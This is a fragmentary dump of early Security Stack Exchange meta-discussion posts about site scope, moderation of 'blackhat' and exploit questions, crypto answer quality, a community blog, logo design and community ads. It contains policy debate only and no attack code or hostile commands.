However someone asked it - Because they want to learn!
Drawing a line simply isolates these people and causes untold harm to the site.</p>

<ul>
<li>StackOverflow</li>
<li>ServerFault</li>

<p>One part of the problem is that this site has substantial overlap with those other sites. Many questions which <strong>should</strong> be asked here, are instead asked there - and mostly answered - even if often not correctly (ma laasot, programmers dont always know as much security as they think they do :) ).  </p>

<p>So the first thing we'd need to do - get the SO/SF crowds to ask their questions here.<br>
I've gone to many questions, and left a comment saying they'd get better results here - sometimes it works, mostly it doesnt. But that is definitely the first place to go, since most of the users there don't even know about IT Security SE.  </p>

<p>The second part might be harder - the types of people that are not on either site - e.g. CISOs, Risk Managers, consultants, etc. These would also have much higher level of questions...<br>

Personally I already spammed all the infosec groups I'm a member in on LinkedIn, which I think helps a bit... Also sent the link to many clients, colleagues, and other people I work with. I suggest you (and everyone else here) do the same, if you haven't already.<br>

Imagine an important business contact seeing information about you WoW conquests just as you're working to close a large deal.  Bad idea...</p>

The question ""should I trust Bob?"" is not a question for IT security professionals, whether Bob is Google or my neighbour.</p>

<p>Anyway, you may want this kind of question to be on-topic, or you might want to edit it to make it more useful. So I'm not going to use mod-fu to close it before you've had a chance to discuss it here.</p>

<p>Are you suggesting anonymous as in not logging in, or log in and post anonymously?  </p>

<p>The second is the only one that makes sense for being able to give feedback (and also prevent abuse).  It would make sense to generate a one-time username that is associated with the question that you can access via your main account.  That way you can log into your normal account, and have your ""anon"" questions visible (only visible to you but not publicly linked to your account).  This would require you to trust the site admins (and possibly moderators).</p>

<p>For partial anonymity, I think most people will be fine with pseudonyms.  Create another ID and use that for sensitive stuff.</p>

<p>For full anonymity, the truly paranoid would need to compartmentalize their questions across many openIDs to reduce the information leakage across multiple questions.  I don't think this is too much of a burden for the few people that need it.  The people with the greatest security needs should pay the most.</p>

92,2,2010-12-27T13:15:55.690,2,,"<p>There are four themes which I think summarise the discussion here so far:</p>

<ol>
<li>The FAQ is currently not representative of the questions expected</li>
<li>The questions we want to encourage are related to people who are IT security professionals, professionals who have to implement IT security, and people in corporate settings having to deal with IT security issues (from CIOs to home offices).</li>
<li>We don't want to leave non-professionals out in the cold, especially if their questions meet all other criteria and are asked well</li>
<li>IT security affects everyone that uses a computer (and probably many who don't)</li>
</ol>

<p>Now the content of the FAQ is the subject of other questions but I think when it's resolved things will become a lot clearer. The dilemma stems from points 2 and 3 but I think simplicity is the key - answer questions relating to point 2, close questions relating to point 3. I think a good line in the sand is a home business (point 2) and working from home (point 3). The responsibilities and context are different, even if the advice is the same (which means those working from home can use the answers to the home business questions!).</p>

<p>When closing questions because of point 3 I think it should become etiquette to leave a comment pointing to another resource that answers the question (security blogs, OWASP, etc): <em>""we want to answer your question, just not here.""</em> If the question's really good or could be of use to professionals then there's nothing wrong with the community making exceptions and answering the question as long as the exception's explained in a comment. This helps clarify the expectations of the site while being helpful and spreading knowledge if the question deserves an answer. </p>

<p>If this individual had asked if he/she could use a javascript code snippet he/she copied from the viewing source of somewebsite.com in his new app without copyright infringement it would be off topic, as it doesn't relate to IT Security, it relates to legal aspects of intellectual property, not vulnerabilities and exploitation, etc..</p>

<p>However, out of all IT-type personnel, I believe that ITSec folk would have the best ""feel"" for these issues, simply from (a) experience with compliance issues, and (b) overall risk management (for those that do that) - albeit a business risk, and not a technical one. Most likely, the answer should be to point to an actual lawyer - but perhaps not always.... </p>

<p>Like the case under discussion. Again, while I agree that questions that are net about copyrights should be offtopic, this question was more around the viable options for using cryptography.<br>
I'd even say that the question, while a good one, was not expressed well, probably from lack of knowledge of the OP. That is to say, though the question seemed to focus on copyright, what the OP <em>really</em> wanted to know is ""What cryptographic libraries can I use, and what restrictions are there?""<br>
Since it's (usually) on ITSec's recommendation to <em>use</em> crypto, it would be legitimate to expect them to have a viable solution :)  </p>

It is clear that <a href=""https://security.stackexchange.com/q/1533/33"">this question</a> is ontopic, I don't think anyone would object... but its about laws, right? Privacy laws. why is that okay?<br>
Simply put, because there <em>are</em> laws that are in the domain of InfoSec. I don't doubt that I (or privacy expert) would be better suited to answer most practical questions around privacy, than a lawyer. (Though of course when it comes to litigation and potential repurcussions, of course a lawyers input is needed.) To some extent, this applies in other areas, too...</p>

<p>Appreciation is always nice to receive, as well as polite and friendly to give.

<p>While comments may not greatly affect the loading weight of a page, they do have a measurable impact on the vertical real estate that is taken up by the question or answer post to which they are attached.

128,1,2011-01-07T09:58:15.533,9,232,"<p>What's the plan to ensure that highly-ranked answers are free of non-obvious security flaws?</p>

<p>A good answer to a question should have two properties: it is <em>helpful</em>, and it is <em>correct</em>.  Voting (the wisdom of crowds) is a great way to bubble up the most helpful answers (the ones that are constructive, clearly written, etc.).  But when it comes to deeply technical subjects, like cryptography, it's not clear to me that voting will be effective at assuring that answers are correct (especially, free of subtle security flaws).</p>

<p>I'm concerned about the following scenario.  Karl asks a question about crypto.  Paulina the programmer posts a helpful answer: it is concise, clearly written, describes a simple solution, and even comes with some sample code.  Lots of Stack Exchange members vote it up.</p>

<p>Sounds great, right?  But suppose Paulina's answer is actually incorrect.  It is simple, but wrong: it has a non-obvious security hole, which is only apparent to crypto wizards.  Charlie the crypto wizard spots the problem in Paulina's answer.  What should Charlie do?</p>

<ul>
<li><p>Perhaps Charlie should just refrain from upvoting Paulina's answer, and move on?  But this doesn't work.  If 99% of the Stackexchange members are ordinary mortals, and 1% are crypto wizards, and the flaw is only apparent to crypto wizards, then instead of getting 100 upvotes, the answer will get 99 upvotes.  Same outcome.  That doesn't help.</p></li>
<li><p>Perhaps Charlie should post a comment after Paulina's answer, with an explanation of the flaw?  But typically, a full explanation of the flaw won't fit in a one- or two-line comment.  Comments aren't a very good mechanism for this.</p></li>
<li><p>Perhaps Charlie should just post a brief one-line comment, saying that Paulina's answer is insecure (without explaining why) and say that readers should just trust Charlie?  That doesn't seem in line with the Stack Exchange philosophy of meritocracy, and it doesn't seem likely to cause Paulina's answer to be ranked lower.</p></li>
<li><p>Perhaps Charlie should write a separate answer that just explains why Paulina's answer is wrong?  But that's not proper use of Stack Exchange: you're not supposed to use answers to comment on other answers.</p></li>
<li><p>Perhaps Charlie should write a separate answer explaining the proper way to do things, and give a detailed tutorial on why it is the right way to do it (without commenting on Paulina's answer)?  That may be the least-bad solution, but there's not always a short and convincing way to convince non-experts why something is the right way, without first teaching them chapters of cryptographic theory.  If Paulina offers a simple solution that sounds plausible to non-experts, and Charlie offers a complex solution that seems unnecessarily complicated to non-experts, guess which answer is going to get voted up?  I'm guessing Paulina's gets voted up, even if Paulina's answer is insecure.</p></li>
</ul>

<p>Part of the problem is that the Stack Exchange format doesn't seem designed to support detailed analysis of other people's answers.</p>

<p>Maybe a more important aspect of the problem is that crypto is subtle stuff.  The details matter, and it's very common that plausible-seeming approaches actually contain subtle security flaws (which aren't always easy to explain to a non-expert).  Moreover, in my experience, it's very natural and tempting for developers to want to invent their own solution and feel overly confident that they are up to the task.  As Bruce Schneier has written, it's easy to come up with a scheme that seems secure to you.  It's easy for Alice to come up with a scheme she herself can't break; the hard part is to come up with a scheme that others can't break.  It's natural for readers to up-vote simple, plausible-sounding answers, but in cryptography, the simple answers aren't always secure, and the plausible-sounding solutions can have serious (but non-obvious) solutions.  This seems like a special challenge for this Stack Exchange site.</p>

<p>So, is there any plan to deal with this problem?  And what should Charlie the Cryptographer do in these kinds of situations?</p>

<p>Almost all exploits can be legitimately used for pentesting and at the very least illustrating to the CTO/CEO why <em>issue X</em> needs to be handled immediately.  Sometimes it is nearly impossible to make the business case until you show an executive how quickly the exploit can cause damage.</p>

<p>I agree there should be a line drawn somewhere, but I'm beginning to think it should err on the side of exploits and <strong>not</strong> censoring knowledge.  Most likely people on here aren't inventing these exploits so the information is out there anyway for people to find.  At least if it is here we can put it into context.  Under the assumption that most people on here are professionals, <strong>full disclosure benefits us a lot more than the blackhats.</strong></p>

<p>Here are some thoughts:</p>

<ol>
<li>Asking for exploits against a specific person (company) are banned unless client-side information snooping.  ie: attacks against their machines are banned, but tools illustrating auth attacks and weakness like firesheep should be discussed.</li>
<li>Malware construction questions are out of scope. </li>
<li>Even 0-day exploits are useful for testing.  How else can one check if workarounds work?</li>
<li>Personal discretion.  Most of us are professionals.  People should feel free to hold back information if they think it necessary.</li>
<li>Intent.  This is such a weak defense, because it just raises the bar to just phrasing carefully--at least it sets the tone and attitude of the community. </li>

I was torn on the Windows 7 question Rory mentions.  I answered it and then voted to close (after agreeing with AviD's comment on it).  Even bad and closed questions are a chance for people to learn.  And it serves as a record to other people that might ask a similar question.</p>

<p>The ideal solution would be in a scenario where Charlie has enough reputation to edit posts.  Charlie could edit Paulina's answer to reflect the more accurate details.  However, this would only be appropriate if the correct solution was a relatively slight deviation from Paulina's proposal.</p>

<p>Charlie could post his own answer, and flag Paulina's for moderator attention.  If Paulina's answer truly is flawed in a significant way, and it has received an indomitable number of up-votes, it may be worth having it deleted to allow the better solution to rise up.  The moderators should be members who either have earned enough reputation through their work on the site, or who have been voted in because of their recognized experience in the field and demonstration of sound judgment to the community.  Therefore, the moderators should be capable of identifying when deletion of an answer for this reason is reasonable, and taking the appropriate action.</p>

<p>URL shorteners pose several risks to users, which we as IT Security professionals should all be keenly aware of and sensitive to.</p>

<p>Primarily, the threat is that (absent special tools or plugins) you never really know what website is behind a shortened URL until you've clicked on it - at which point it is usually too late to avoid whatever threats lay behind it.  This not only leaves the user vulnerable to intentionally posted malicious links, but also to the possibility that the URL shortner's service may be hacked and the links may be redirected en masse.</p>

<p>Secondarily, it has also been mentioned that some shortened URLs have a finite lifetime, leaving the links dead after awhile.  This of course means that links which originally had great value on this site could eventually flat-out die irrecoverably.</p>

<p>I suggest we keep an eye out for these shortened URLs, both in actual posted URLs and in hyperlink destinations, and that users with edit privileges un-shorten them wherever they are found.  Additionally, there should be a note added to the FAQ which states that shortened URLs should not be used here.</p>

<p>This blog post that AviD pointed out is worth quoting from:
<a href=""http://blog.stackoverflow.com/2010/08/the-death-of-meta-tags/"" rel=""nofollow"">The Death of Meta Tags - Blog – Stack Overflow</a></p>

<blockquote>
  <p>How can you tell you’re using a
  meta-tag? It’s easier than you might
  think.</p>
  
  <ul>
  <li>If the tag can’t work as the only tag on a question, it’s probably a
  meta-tag. Every tag you use should be
  able to work, more or less, as the
  only tag on a question. Meta-tags,
  like [beginner], [subjective], and
  [best-practices], are useless by
  themselves — they tell you nothing at
  all about the content of the question.</li>
  <li>If the tag commonly means different things to different people, it’s
  probably a meta-tag. In a cruel,
  ironic twist, the meaning of the tag
  [subjective] itself … is actually
  subjective. Ditto for [best-practices]
  and [beginner]. Best practices to
  whom? Beginner by what criteria? These
  tags are impossible to define by
  anything remotely resembling an
  objective metric. In comparison, the
  the meaning of tags like [java], [c#],
  and [javascript] are crystal clear to
  all but the nuttiest of nutbags.</li>

<p>Security is a very contextual topic: threats that are deemed important in your environment may be inconsequential in somebody else's, and vice versa. Are you trying to protect something of global value against <a href=""http://en.wikipedia.org/wiki/Advanced_Persistent_Threat"" rel=""nofollow"">Advanced Persistent Threats</a>?  Or are you looking for a cost-effective approach for a low-profile small business? To get the most helpful answers you should tell us:</p>

<ul>
<li>what assets you are trying to protect</li>
<li>who uses the asset you're trying to protect, and who you think might want to abuse it (and why)</li>
<li>what steps you've already taken to protect that asset</li>
<li>what risks you think you still need to mitigate</li>
</ul>

<p>This is essentially a summary of your <a href=""http://en.wikipedia.org/wiki/Threat_model"" rel=""nofollow"">threat model</a>, or risk profile, if you've already created one. Providing this information will also help you organize your own thoughts about your security issues.</p>

<p>Whenever you run across these - just flag it for moderator attention as spam, and one of us will hop in and take care of it.<br>

<li><p>Describe a real technical need, and a technical solution, and point to your app as an example, with a price point?  That sounds like actual market research, but not the sort of thing I want folks to be doing here - it will typically be conflict-of-interest and subjective as to how well the app meets the needs.</p></li>
<li><p>List some products, including yours, and ask which is best?  At least that helps put things in perspective, and invites more comparisons, but even that would need some guidelines to not be ""subjective"" and those guidelines run the risk of people with a conflict-of-interest putting up rigged requirements that highlight their particular option.</p></li>

<p>Should we </p>

<ol>
<li><p>comment that the answer is wrong</p></li>
<li><p>edit the answer ourselves if we can (even if it's already been accepted and even if it needs a lot of edits?)</p></li>

250,1,2011-04-22T01:30:42.970,5,79,"<p>Apparently, IT Security places limits on the number of votes I can cast in one day.  This limits participation on the site.  Now that I've reached my vote limit for the day, I find myself quickly losing willingness to read other questions and answers and contribute.  If not the vote limit, I would have continued reading and contributing.</p>

<p>One of the reasons I participate on the site is that I know something about the topics, and I feel I can contribute: sometimes by answering a question myself, if it does not already have a good answer, but more frequently by upvoting other good answers that already exist.  I feel like I am doing good for someone and doing a public service.  Once the site removes my ability to contribute in that way, I find I have little motivation to spend any more time on the site or look at any more questions or answers.</p>

<p>I don't have a schedule that lets me check in to the site every day.  Instead, my participation is bursty: when I have a little time, I try to check out a whole bunch of questions/threads on the site.  However, the site's low daily vote limit does not seem designed to support that kind of participation.</p>

<p>I'm sure I'll be back at the site again sometime, but I'm just pointing out how the design of the system discourages contribution and causes at least one user to walk away.  Seems like a dubious design decision to me, from the perspective of user experience and building community.</p>

I'd love to hear some suggestions from the community about <strong>what type of contests you'd like to see.</strong> We have resources to support this sort of thing. Whether it is some sort of funding or back-end development or database support, <strong>post your ideas here!</strong></p>

<p>Promoting more quality questions is a strong step in the right direction; You need those questions to bring in new users. But don't wait on us. You already have a source of high-quality questions here! The <em>real</em> effort that is going to promote healthy, organic growth on this site is <em>using</em> those questions to attract more users.</p>

<p>We find that highlighting your most intriguing questions is the best way to bring new users to this site. Those social bookmarking tools (Facebook, Twitter) are invaluable to highlighting your most intriguing questions and bringing new and interested users into this site.</p>

<p>So a few things: keep the quality high; That is the most important goal at this stage. And use those social bookmarks!</p>

<p>Key points from @Rebecca:</p>

<p>Here are some guidelines that I would expect to see from a community wanting a blog:</p>

<ol>
<li>Raise the idea on the child meta. A community blog needs the involvement of community members.</li>
<li>Define the scope and purpose of the blog. Is the blog about the site? Is it about the site's topic? Is it about the industry around the topic? Keep in mind the audience of your community and their interests. Another generic blog about  may not be all that interesting.</li>
<li>Recruit contributors. Who will write entries for the blog? Starting a blog is a bit like going through the buffet line. Be realistic - don't let your eyes be bigger than your stomach. Think seriously about if and how often you will be able to contribute a blog post, including research/prep time.</li>
<li>Plan a schedule. Given the results of steps #2 and #3, think about a rough idea of a schedule for the blog. Will there be one post a week, posted Mondays? Will there be  posts on Tuesdays and  posts on Fridays? You don't need to be pushing out posts daily, but I would say at least one post a week.</li>
</ol>

<p>Please respond if you are interested - we'll need to get an idea of whether we have enough volunteers, enthusiasm, hot topics etc.</p>

Clearly this account would be subject to monitoring by SE, and the point of such account would be to represent the both the ""professional"" and ""collective"" nature of the community.</p>

<p>Reason I ask is that my idea would be to attempt to contact top professional security professionals, and offer them a chance to do a guest blog on the SE-Security site.</p>

<p>While doing this via a non-SE channels is clearly possible, it would not reinforce the nature of the request, nor for that matter would it allow SE-Security to maintain relationships with external experts as a community.</p>

<p>If admins had access to a shared account, then I'd be happy to help generate a list of professionals to contact, guidelines for posting to the blog, emails to solicit engagement, etc.</p>

<p>I'd also suggest that the SE-Security community be encouraged to market the blog on behave of the community, possibly in a way that would results in reps being earned by the member.</p>

<p>It would also help if the blog post is VERY clearly marketed on the main SE-Security site and SE-Security-Meta via the standard inline banner alerts at the top of the page; meaning a user always get the alert once, and only once per posting, and that if more than one posting has taken place since they were last on the site, they one get one alert for the most recent SE-Security blog posting.</p>

<li>Reiterating my in-ness.</li>
<li>Scope - this is a bit tricky, since as has often come up, this site has several distinct types of users, and different areas of (exclusive) interest: networks, operating systems (further divided by Windows / Linux / etc), attacking applications (e.g. pentesting, exploits, etc), building applications (e.g. secure coding, code reviews, etc), cryptology, and risk management, just to name a few.<br>
I think the blog should cater to all these, perhaps alternating between them - and preferably, focusing on the ""high level issues"" that should interest most. Given the wide range of specialties of the bloggers, I think it could work to have each blog about their own, with (hopefully) some thread in common. E.g. A monthly ""theme"" could be really interesting, and then ""examine"" it from several different perspectives and focii.<br>
The tricky part is finding the correct balance... and then once in a while, mixing it up by throwing in something not as relevant, but esoteric and interesting nonetheless (I can think up a few ideas like that).<br>
Also, periodically we can check which questions/answers garnered exceptional interest (views+votes), or generated potentially interesting discussions but were not really questions, and do a post on that. </li>

<li>I think we can aim for 3 posts every ~2 weeks, but I dont think we need to keep to a strict schedule. Though if we have a large enough pool of potential bloggers, we can set up a rota a few weeks in advance, and even have a few posts in queueue.   </li>

It could have been the start of a very interesting discussion, except it was oddly closed for being ""too blackhat"".</p>

<p>This is ridiculous.</p>

<p>I asked only what techniques may exist to do so, not for advice on actually doing so.</p>

<p>I would think that question is not so different from other bypassing questions on this site, such as how to bypass <a href=""https://security.stackexchange.com/questions/2010/bypassing-address-space-layout-randomization"">ASLR</a>.</p>

<p>The question is, to what extent do you determine a question is blackhat? Simply asking about an attack scenario is not enough, as there is nothing inherently blackhat about discussing potential attacks.</p>

<p>Now, if someone is asking for specific tools or instructions for a scenario, then that could be considered blackhat. In this case however I asked about potential attacks, with the question and level being similar to what would be presented at any security conference.</p>

<p>I would propose that simply asking how things can be bypassed, or what the potential attacks may be in a scenario should not be considered blackhat, as ideally good questions will be abstracted enough where it is possible to determine motivation.</p>

<p>It only makes sense for questions which are obviously blackhat to be considered blackhat. Thoughts?</p>

<p>There is no such thing as black and white, only shades of gray.</p>

<p>After that deep philosophical bombshell: it's a subjective call. Any information can be used both constructively and destructively. I think the difference is in the impression of intent. The ASLR question, for example, says:</p>

<blockquote>
  <p>How <strong>effective</strong> is ASLR in <strong>preventing</strong>... How hard is it for <strong>an attacker</strong></p>
</blockquote>

<p>For a start, you're not asking: ""how do I bypass ASLR?"". Secondly, the question is posited as an evaluation of the defence and the threat. None of the answers actually detail any mechanisms.</p>

<blockquote>
  <p>What would be some <strong>hypothetical</strong> ways to bypass a captive portal? How <strong>could you bypass</strong> this? </p>
</blockquote>

<p>I won't pass judgement as to whether you intend to use this or not. Likely you don't, as you're here on meta, but see how it looks? What if it was:</p>

<blockquote>
  <p>I have a wireless network with two separate LANs, one isolated to ensure all users sign our AUP with a restricted set of services, and one for users who have signed it. Is it possible for a malicious user to circumvent this and if so how do I prevent it?</p>
</blockquote>

<p>Pretty much the same question, but looks totally different in terms of intent. If I were  to draw the line in the sand, I would say the key in my version would be that you're coming at it from a defence angle too. </p>

<p>Do I think it should have been closed? Don't know. Moderators are only other human beings and they sometimes make mistakes, but I can see what their reasoning might have been. </p>

However, I will say that <em>my</em> evaluation of that question is that it's overly vague. ""How can a network's captive portal be bypassed"" depends on the implementation of the captive portal, its integration into the host network and how much access an attacker has. Even if a good answer using assumptions based on today's common practice were provided, that answer could quickly become outdated or may not apply to the situation you're asking about.</p>

<p>I would prefer to see a question that details the situation you're working with, and asks for discussion of the residual risk and remaining attacks against that situation. Honestly, whether you intend to use that information for evil is unimportant to me for the purposes of deciding whether you get a good answer (though of course I would frown on evil applications, and remind you to check the legality of any actions you take). My reasoning is that even if you choose to use the site's powers for good, someone else will not.</p>

<p>Many folks, whether sysadmins or programmers or managers or the proverbial grandmother are just trying to get a task done and will often take a shortcut without thinking about the consequences.  This is the site where all those sorts of folks should get to interact with people who are adept at seeing the problem from all angles, thinking like an attacker, and explaining the consequences, and how to avoid such problems and design for security.</p>

<p>It is an advantage to be able to help all those folks see this mindset in action for their home systems.  The major downside I'm concerned about is that some great IT folks will get tired of seeing questions about ""mere"" home systems.  To them I suggest that the growing wave of spearfishing attacks means that we actually do have to get end users educated about these things, and we often want their home systems secure also.  So I think it is shortsighted to restrict this to what the ""pros"" want to talk about.  Keeping an ear to the ways that end-users think about things will help us design improved user experiences and better  explain things to our users.</p>

<p>A key difference between black and white hats is that white hats try to help, to fix, to find the problems and teach the admins how to remediate.</p>

<p>So in my opinion providing education so that security professionals can not only learn how to break, attack, exploit etc. but also to detect attacks, identify issues, fix problems and protect assets is what can make a question or answer white hat.</p>

<p>So let us not just ask for exploits, or tell people how to break in, lets provide guidance on how to keep the bad guys out! </p>

302,2,2011-06-17T16:33:00.447,5,,"<p>The reason I think this issue is important is because it will affect how the site is viewed by the most savvy and potentially helpful white-hats out there.  I want them to get involved here.  If the site has lots of questions that would appear shady to a first-time googler, they are simply less likely to want to associate themselves with it.  So how things are worded is important, not just the technical content.</p>

<p>Beyond that, I think that setting a constructive tone of voice is also an important element of how to word questions here, so that even when they technically are useful to both extremes, they are slightly more helpful to the white hats and at the same time are less attractive or helpful to the script kiddies.  Though I also am not generally a fan of ""politically correct"" language, I think we should try to move the questions and answers here in the direction of being ""professional"".</p>

<p>One aspect of that is that in cases like this one, questions be worded to ask for help with mitigating any weaknesses, as well as avoiding explicit exploit code.</p>

<p>I'll also agree, as Ninefingers notes, that there is indeed a lot of grey in between white and black.  Unfortunately this introduces more room for ""subjective"" interpretations which can easily get out of hand.  This can easily lead to jumping to conclusions and being rude with each other, and I urge folks to recognize that and try to avoid it.</p>

<li>I think it's a great idea, and could probably contribute regularly-but-infrequently. Due to time commitments on other community projects I'd better not be driving it :)</li>
<li>Putting on my ""pro tem mod"" hat, I think the audience has to be site contributors and <em>those who are not yet site contributors, but would be if they knew about the cool discussions we were having</em>. That informs the choice of content too. I say a good way to pick a topic is to find an interesting question on the site, then talk about issues related to that question (without necessarily answering it in the blog post). This can get readers interested in that question and perhaps thinking about new answers, from where they might answer other questions and even become regular contributors.
Eventually such posts can be derived from ""recent"" interesting questions, but initially they can come from <em>any</em> interesting question because most potential blog readers won't have seen any of the site content.</li>
<li>If you can find four people who are willing to write a post every month, you already have a post every week. If you can harangue people in the main site to write guest posts every now and again, then you don't even need a core of regulars :).</li>
<li>I don't think a schedule is a key feature for any blog. Looking at stats for my blogs, more than half of the readers come from RSS and most of the remainder are 'refered' (to borrow HTTP's spelling) by Twitter.

<li>How to we kick off? @Rebecca - when do we go live?</li>
<li>Timelines? - had we agreed that a post at least once a fortnight was good (but that the exact timing wasn't critical as many will just follow the RSS feed)</li>
<li>How do we gain access? (CMS, user authentication etc)</li>
<li>What review/editorial structure is there? (through SE team, or through volunteers at our end?)</li>
<li>If it is managed by us, @IvoFlipse had a good idea of holding a shared google doc with a list of topics and names so people could write articles and have them ready for publishing as needed.</li>

  <p>Define the scope and purpose of the blog. Is the blog about the site? Is it about the site’s topic? Is it about the industry around the topic? Keep in mind the audience of your community and their interests. Another generic blog about  may not be all that interesting.</p>

<li>Corporate/People aspects</li>
<li>New Security (IPv6, Cloud etc)</li>
<li>Cryptography (Comms, Authentication, Data Storage etc)</li>

<p>Logo guidance, from Jin (resident UI designer for at least some of the Stack Exchange sites):</p>

<blockquote>
  <p>Please note: I prefer gray-scaled logo
  submissions, that way we can judge the
  IDEA of the logo more objectively. We
  can always add colors to the logo
  later. Also, the logo itself(sans the
  site title text) should be able to fit
  in a square dimension nicely. This way
  we can use it for favicons, mobile
  touch icons etc.</p>

<p>There is an easy fix for this, get core users to contribute questions. Currently Area 51 reports 170+ users with 200+ rep. If core users contributed a question every 14 days that would add an average of about 12 questions per day. Contributing a high quality question every two weeks is not too burdensome. It could be done informally or formally. Informally, an awareness campaign to the core users to contribute. Formally, a site mechanism to indicate days since a user asked a question, and or gentle reminders to contribute questions.</p>

<p><strong>Visits per day</strong></p>

<ol>
<li>I like @AviD's idea of asking relevant questions before the conference, and then tweeting them during the conference. Timely content is very powerful. One minor issue with that is that I don't spend a whole lot of time on this site, so my knowledge of what questions have been asked is very limited. I think a good way to solve this would be to start a meta thread listing all the <a href=""http://blackhat.com/html/bh-us-11/bh-us-11-briefings.html"" rel=""nofollow"">Black Hat talks for this year</a>, and then under each talk we can list current questions relevant to that topic that I can tweet. That way all I have to do is go to that list for each talk, and tweet away. As a bonus, doing this will make it easier for folks to see what topics will be covered, and come up with relevant questions on those topics if there are none on the site yet. Thoughts on this?</li>
<li>Assuming the custom swag is ready in time for the conference, in addition to tweeting relevant questions during the conference, what if I also tweet things like:</li>

Each site will have its own unique theme that will reflect its topic. However, all sites will share quite a bit of common elements so they feel like they're part of the Stack Exchange family.</p>

<p>First, thank you for starting the design <a href=""https://security.meta.stackexchange.com/questions/325/in-planning-for-that-time-when-we-leave-beta-we-need-a-visual-identity"">discussion thread</a> early. I read every suggestion and comment, they were helpful. </p>

<p>For every Stack Exchange site I design, The first thing I do is to come up with a few words that describe what the niche topic is about. The design should capture those words through visual language and invoke the right emotional response. For IT Security, I came up with ""protection,"" ""guardian"" and ""technology."" IT Security professionals have been on the front line against malicious cyber acts for a long time. With the recent high profile hacking events, your role is more important than ever. </p>

<h2>Logo</h2>

<p>There are two commonly used motifs for security: padlock and shield. I feel a shield is a better representation of IT Security. It's not just about locking the door, but also about  constantly defending. The shield metaphor is used for a lot of security related sites and software, how can we make our shield be unique and memorable?</p>

<p><img src=""https://i.stack.imgur.com/tRbwg.png"" alt=""Heraldic Shields""></p>

<p>I've always been a big fan of the <a href=""http://en.wikipedia.org/wiki/Heraldry"" rel=""nofollow noreferrer"">Heraldic</a> designs. I believe a modernized version of the coat of arms treatment is the appropriate approach. It invokes that authoritative and timeless feel.</p>

<p><img src=""https://i.stack.imgur.com/WTaPS.png"" alt=""Logo""></p>

<p>Above is the grayscale logo I came up with. I chose the lion because it symbolizes strength and valor. The wings represent swiftness and protection.</p>

<p>The logo is not just used for the website. It's the visual identification this Stack Exchange community. It will be used in other mediums too. For example: social media icons, t-shirt, stickers, flyers, moderator cards etc. </p>

<h2>Site Design</h2>

<p><a href=""https://i.stack.imgur.com/H5tmm.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/H5tmm.png"" alt=""IT Security Site Design""></a>

<h3>Header</h3>

<p><img src=""https://i.stack.imgur.com/hdJDK.png"" alt=""Header""></p>

<p>Here you can see how the logo is actually implemented on the site. I've added some design elements to it to show the technology aspect. The blue signals(defense) coming out of the emblem intercepting the red signals(attacks) conveys the protection aspect. Also the Tron-ish color scheme and the subtle scan-lines make it more ""techie"" too. </p>

<h3>Color Scheme</h3>

<p><img src=""https://i.stack.imgur.com/Smtcc.png"" alt=""Colors""></p>

<p>I went with mostly blue shades for the site, with a dark red for accent colors. I feel these colors are fitting for enforcement.</p>

<h3>Over all</h3>

<p>The content area below the header is fairly clean. I didn't want to over decorate it. After all, people come to the site for its content, I don't think the design should overwhelm it.</p>

<p>I will be posting another screenshot of the individual question page on Friday.</p>

<h2>Other Designs</h2>

<p>As I mentioned above, the logo will be used for other materials as well. Here are some mockups of how it'd look on a t-shirt and sticker. (note: these are just mockups for now, I may make modifications to them later).</p>

<p><img src=""https://i.stack.imgur.com/Qseh4.png"" alt=""T-shirt""></p>

<h2>Feedback</h2>

<p>I'm excited that Security.SE will be graduating soon, so an early congrats from me! Please let me know what you think of the design. I believe it works for the goals I mentioned. </p>

<p>Please post any question that you feel is of worth and the reason why. Try not to promote your own questions or answers for publicity sake. We are looking for questions that are of great interest, or have exceptional answers. If you like a posted question then vote it up. Each week we are going to try to post about the question and its contents. </p>

<p>When submitting a QotW, please indicate if you would be interested in writing about it for the blog. This is a factor which we take into consideration when selecting what to blog about - we need a post we can actually say something interesting about, it shouldn't be something we've written about too much before, and it helps to have somebody interested in writing the article.</p>

<p>Note to the answerers, if you dig a question, you can always submit a draft blog post about it, even if its not picked as QotW.

Some people use 'buesiness class' computers at home, or they work from home. You also don't need to be protecting 100 machines to ask a relevent question. For example, asking about <a href=""https://security.stackexchange.com/questions/5075/three-factor-authentication-for-windows"">Three-factor authentication for windows</a> is relevent. Even if it just for someone's personal laptop.  Given it is a lot more likely that a corporate IT professional managing a fleet of desktops asks a relevent question than a home user.  </p>

On the other hand, even if you're managing warehouses of servers, if all you want is ""gimme shome script so I can foget about the stupid firewall"", then I don't think this is the place for you.   </p>

<h3>What in the Wide, Wide World of Sports is Going On Here?</h3>

<p>TL;DR -- put images and links in the answers. If they get voted up enough, they will appear on the main site as community promotion ads.</p>

<h3>But whyyyyyyy?</h3>

<p>This is a method for the community to control what gets promoted to visitors on the site. For example, you might promote the following things:</p>

<ul>
<li>cool site-related open source apps</li>
<li>the site's twitter account</li>
<li>the site's blog</li>
<li>scripts packs or power tools</li>
<li>cool events or conferences</li>
<li>anything else your community would genuinely be interested in</li>
</ul>

<p>The goal is for future visitors to find out about <em>the stuff your community deems important</em>. And to click on it for great justice!</p>

<h3>How does it work?</h3>

<p>The answers you post to this question <em>must</em> conform to the following rules, or they will be ignored. </p>

<ol>
<li><p>All answers should be in the exact form of:</p>

<pre><code>[![Tagline to show on mouseover][1]][2]

   [1]: http://image-url
   [2]: http://clickthrough-url 
</code></pre>

<p>Please <strong>do not add anything else to the body of the post</strong>. If you want to discuss something, do it in the comments.</p></li>
<li><p>This question must always be tagged with the magic <a href=""/questions/tagged/community-ads"" class=""post-tag moderator-tag"" title=""show questions tagged &#39;community-ads&#39;"" rel=""tag"">community-ads</a> tag.</p></li>
</ol>

<h3>Image requirements</h3>

<ul>
<li>The image that you create must be <strong>220 x 250 pixels</strong></li>
<li>Must be hosted through our standard image uploader (imgur)</li>
<li>Must be GIF or PNG</li>
<li>No animated GIFs</li>
<li>Absolute limit on file size of 150 KB</li>
</ul>

<h3>Score Threshold</h3>

<p>There is a <strong>minimum score threshold</strong> an answer must meet (currently 6) before it will be shown on the main site.</p>

<p>You can check out the ads that have met the threshold with basic click stats <a href=""https://security.meta.stackexchange.com/ads/display/372"">here</a>.</p>

  At the very least, sponsorship of local OWASP chapters / meetings should be a must.</p>
</blockquote>

<p>Now, with the conference coming up, I'm even more invested here, as I am on the IL chapter board and responsible for the conference... :) </p>

